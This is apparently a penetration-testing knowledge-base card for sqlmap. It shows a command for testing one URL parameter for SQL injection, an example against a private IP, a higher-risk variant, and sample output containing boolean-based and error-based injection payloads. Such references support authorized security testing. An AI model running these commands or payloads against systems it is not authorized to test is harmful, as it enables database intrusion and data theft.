---
id: 759fcbe6-1daa-48c2-a087-ae887005d316
name: sqlmap-specify-parameter
type: command
executor: bash
data: sqlmap -u "$_TARGET_URL" -p $_PARAMETER
output: >-
  [INFO] testing connection to the target URL

  [INFO] heuristic test shows that GET parameter '$_PARAMETER' might be
  injectable

  [INFO] GET parameter '$_PARAMETER' is 'error-based' injectable

  sqlmap identified the following injection point(s):

  ---

  Parameter: $_PARAMETER (GET)
      Type: boolean-based blind
      Title: AND boolean-based blind
      Payload: ...
created_at: '2020-09-02T17:40:37.458182+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Linux
  - Web
tags:
  - sqli
  - sqlmap
verified: true
validated: true
---

# sqlmap-specify-parameter

## Command

```bash
sqlmap -u "$_TARGET_URL" -p $_PARAMETER
```

## Description

This command uses SQLMap to test a specific parameter in the target URL for SQL injection vulnerabilities. It focuses payloads on the designated parameter, making it efficient for targeted testing after initial reconnaissance.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_URL | Full URL with query parameters (e.g., http://example.com/login.php?user=test&pass=test) | Yes |
| $_PARAMETER | The specific GET/POST parameter to test (e.g., user) | Yes |
| -u | Specifies the target URL | Built-in |
| -p | Specifies the injectable parameter(s) | Built-in |

## Examples

### Basic Usage

```bash
sqlmap -u "http://192.168.1.10/vcart/login.php?user=demo&pass=demo" -p user
```

### Advanced Usage

```bash
sqlmap -u "$_TARGET_URL" -p $_PARAMETER --batch --level=3 --risk=2
```

> Adds automation (--batch), higher testing levels, and risk for thorough scans.

## Expected Output

SQLMap starts with a banner and legal disclaimer, then tests connectivity and stability. It performs heuristic checks and trials various injection techniques (e.g., boolean-based blind, error-based with FLOOR, time-based). Successful output identifies the injection point, types, and sample payloads, such as:

```
sqlmap identified the following injection point(s) with a total of X HTTP(s) requests:
---
Parameter: user (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: user=demo' AND 1=1 AND 'abc'='abc&pass=demo

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE ... (FLOOR)
    Payload: user=demo' AND (SELECT ... ) AND 'xyz'='xyz&pass=demo
---
[INFO] the back-end DBMS is MySQL
```

Results are logged to ~/.sqlmap/output/.

## Related

- [[procedures/Specify-Parameter-for-SQL-Injection-Testing-with-SQLMap]]
- [[tools/sqlmap]]
